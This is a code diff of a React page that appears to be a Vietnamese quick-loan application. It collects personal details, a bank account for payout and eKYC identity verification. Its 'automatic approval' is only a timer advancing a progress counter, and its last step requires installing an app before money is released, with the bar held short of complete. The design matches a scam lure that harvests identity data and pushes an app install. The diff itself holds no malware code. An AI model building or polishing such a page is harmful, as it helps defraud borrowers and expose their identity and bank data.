@@ -103,7 +103,7 @@
               setCurrentStep(4);
               return 100;
             }
-            return prev + 15;
+            return prev + 20;
           });
         }, 300);
       };
@@ -138,40 +138,9 @@
 
           <main className="max-w-4xl mx-auto px-4 pt-6">
             <div className="space-y-6">
-              
-              {/* Banner giới thiệu */}
-              <div className="bg-gradient-to-br from-red-50 via-white to-rose-50 border border-red-200 rounded-2xl p-5 shadow-sm relative overflow-hidden">
-                <h2 className="text-xl font-bold text-slate-900 mb-2">
-                  Đăng Ký Hạn Mức Vay Nhanh Từ 30 - 100 Triệu VNĐ
-                </h2>
-                <p className="text-slate-600 text-xs leading-relaxed">
-                  Thẩm định tự động minh bạch. Không thế chấp tài sản, thủ tục trực tuyến an toàn và bảo mật tuyệt đối.
-                </p>
-              </div>
 
               {/* Main Multi-Step Form Card */}
               <div className="bg-white border border-slate-200 rounded-2xl p-6 shadow-md relative">
-                
-                <div className="mb-6">
-                  <div className="flex justify-between items-center mb-3 text-xs">
-                    <span className="font-semibold text-red-600 uppercase tracking-wider">
-                      {currentStep === 4 ? 'BƯỚC CUỐI: TẢI ỨNG DỤNG' : `Bước ${currentStep} / 3:`} {
-                        currentStep === 1 ? 'Chọn hạn mức & Thông tin cá nhân' :
-                        currentStep === 2 ? 'Việc làm & Tài khoản thụ hưởng' :
-                        currentStep === 3 ? 'Xác thực định danh trực tuyến (eKYC)' : 'Yêu cầu cài đặt ứng dụng'
-                      }
-                    </span>
-                    <span className="text-slate-500 font-medium">
-                      {currentStep === 4 ? 'Cần cài app để giải ngân' : `${Math.round((currentStep / 3) * 100)}% Hoàn thành`}
-                    </span>
-                  </div>
-                  <div className="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden">
-                    <div 
-                      className="bg-gradient-to-r from-red-600 to-rose-500 h-full transition-all duration-300"
-                      style={{ width: `${currentStep === 4 ? '90%' : (currentStep / 3) * 100 + '%'}` }}
-                    ></div>
-                  </div>
-                </div>
 
                 {/* STEP 1 */}
                 {currentStep === 1 && (
@@ -302,7 +271,7 @@
                 {/* STEP 2 */}
                 {currentStep === 2 && (
                   <div className="space-y-4">
-                    <h3 className="text-base font-bold text-slate-900 flex items-center gap-2">
+                    <h3 className="text-base font-bold text-slate-900 flex items-center gap-2 border-b border-slate-100 pb-2">
                       <i data-lucide="building-2" className="w-4 h-4 text-red-600"></i> Thông Tin Việc Làm & Tài Khoản Nhận Tiền
                     </h3>
 
@@ -437,7 +406,7 @@
                 {/* STEP 3 */}
                 {currentStep === 3 && (
                   <div className="space-y-4">
-                    <h3 className="text-base font-bold text-slate-900 flex items-center gap-2">
+                    <h3 className="text-base font-bold text-slate-900 flex items-center gap-2 border-b border-slate-100 pb-2">
                       <i data-lucide="credit-card" className="w-4 h-4 text-red-600"></i> Xác Thực Định Danh Trực Tuyến (eKYC)
                     </h3>
                     <p className="text-xs text-slate-600">
@@ -516,14 +485,14 @@
                           onClick={triggerAutoApproval}
                           className="bg-gradient-to-r from-red-600 to-rose-600 disabled:opacity-40 text-white font-bold px-7 py-2.5 rounded-xl flex items-center gap-2 text-sm shadow-md shadow-red-600/20 hover:from-red-700 hover:to-rose-700"
                         >
-                          <i data-lucide="zap" className="w-4 h-4"></i> Xác Nhận Gửi Hồ Sơ
+                          <i data-lucide="zap" className="w-4 h-4"></i> Gửi Hồ Sơ & Tiếp Tục
                         </button>
                       </div>
                     )}
                   </div>
                 )}
 
-                {/* STEP 4: YÊU CẦU TẢI APP (CHƯA PHẢI 100% HOÀN THÀNH) */}
+                {/* STEP 4: MÀN HÌNH YÊU CẦU TẢI ỨNG DỤNG (KẾT QUẢ) */}
                 {currentStep === 4 && approvalResult && (
                   <div className="py-2">
                     <div className="bg-white border border-slate-200 rounded-3xl p-6 text-center space-y-5 shadow-[0_15px_35px_rgba(0,0,0,0.08)] transform transition-all relative overflow-hidden">
